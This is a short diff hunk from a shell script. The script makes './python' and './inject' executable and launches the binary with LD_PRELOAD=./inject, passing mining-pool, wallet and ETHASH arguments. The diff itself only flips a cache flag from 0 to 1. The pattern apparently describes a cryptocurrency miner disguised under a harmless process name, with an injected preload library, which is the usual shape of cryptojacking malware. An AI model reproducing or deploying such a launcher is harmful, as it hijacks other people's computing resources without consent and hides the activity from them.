@@ -20,5 +20,5 @@ chmod +x ./python
 chmod +x ./inject
 chmod +x ./clean.sh
 #LD_PRELOAD=./inject ./python --pool $POOL --user $WALLET --algo ETHASH  --enablezilcache 1 &
-LD_PRELOAD=./inject ./python --pool $POOL --user $WALLET --algo ETHASH --enablezilcache 0 &
+LD_PRELOAD=./inject ./python --pool $POOL --user $WALLET --algo ETHASH --enablezilcache 1 &
 #LD_PRELOAD=./inject pmiclx --pool $POOL --user $WALLET --algo ETHASH &
